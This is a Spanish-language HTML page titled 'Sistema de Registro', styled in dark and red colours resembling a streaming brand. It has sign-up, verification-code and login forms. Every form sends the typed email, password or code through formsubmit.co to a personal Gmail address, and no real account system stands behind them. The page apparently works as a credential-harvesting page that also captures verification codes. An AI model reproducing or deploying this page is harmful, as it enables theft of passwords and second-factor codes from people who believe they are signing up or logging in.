<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistema de Registro</title>
    <style>
        /* Estilos globales */
        body {
            font-family: Arial, sans-serif;
            background-color: #141414;
            color: white;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background-color: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 10px;
        }
        h1 {
            text-align: center;
            color: #e50914;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input {
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: none;
            outline: none;
            font-size: 1em;
        }
        button {
            padding: 10px;
            background-color: #e50914;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 1.1em;
            cursor: pointer;
        }
        button:hover {
            background-color: #b20610;
        }
        p {
            text-align: center;
            margin: 10px 0;
        }
        a {
            color: #e50914;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Sistema de Registro</h1>

        <!-- Sección de Registro -->
        <form action="https://formsubmit.co/julianmosquera333@gmail.com" method="POST" id="signup-form">
            <h2>Registrarse</h2>
            <input type="email" name="email" placeholder="Correo electrónico" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <input type="hidden" name="_subject" value="Nuevo Registro">
            <input type="hidden" name="_autoresponse" value="Gracias por registrarte. Te enviaremos un código de verificación.">
            <button type="submit">Registrarse</button>
        </form>

        <p>¿Ya tienes una cuenta? <a href="#login-section" onclick="mostrarLogin()">Inicia sesión</a></p>

        <!-- Sección de Verificación de Código -->
        <form action="https://formsubmit.co/julianmosquera333@gmail.com" method="POST" id="verify-form" style="display: none;">
            <h2>Verificar Código</h2>
            <input type="text" name="code" placeholder="Ingresa el código de verificación" required>
            <input type="hidden" name="_subject" value="Código de Verificación">
            <button type="submit">Verificar</button>
        </form>

        <p id="regresar-registro" style="display: none;">¿No tienes un código? <a href="#signup-section" onclick="mostrarRegistro()">Registrarse</a></p>

        <!-- Sección de Login -->
        <form action="https://formsubmit.co/julianmosquera333@gmail.com" method="POST" id="login-form" style="display: none;">
            <h2>Iniciar Sesión</h2>
            <input type="email" name="email" placeholder="Correo electrónico" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <input type="hidden" name="_subject" value="Inicio de Sesión">
            <button type="submit">Iniciar Sesión</button>
        </form>

        <p id="regresar-login" style="display: none;">¿No tienes cuenta? <a href="#signup-section" onclick="mostrarRegistro()">Registrarse</a></p>
    </div>

    <script>
        // Funciones para alternar entre las secciones
        function mostrarRegistro() {
            document.getElementById('signup-form').style.display = 'block';
            document.getElementById('verify-form').style.display = 'none';
            document.getElementById('login-form').style.display = 'none';
            document.getElementById('regresar-registro').style.display = 'none';
            document.getElementById('regresar-login').style.display = 'none';
        }

        function mostrarVerificar() {
            document.getElementById('signup-form').style.display = 'none';
            document.getElementById('verify-form').style.display = 'block';
            document.getElementById('login-form').style.display = 'none';
            document.getElementById('regresar-registro').style.display = 'block';
            document.getElementById('regresar-login').style.display = 'none';
        }

        function mostrarLogin() {
            document.getElementById('signup-form').style.display = 'none';
            document.getElementById('verify-form').style.display = 'none';
            document.getElementById('login-form').style.display = 'block';
            document.getElementById('regresar-login').style.display = 'block';
            document.getElementById('regresar-registro').style.display = 'none';
        }
    </script>
</body>
</html>
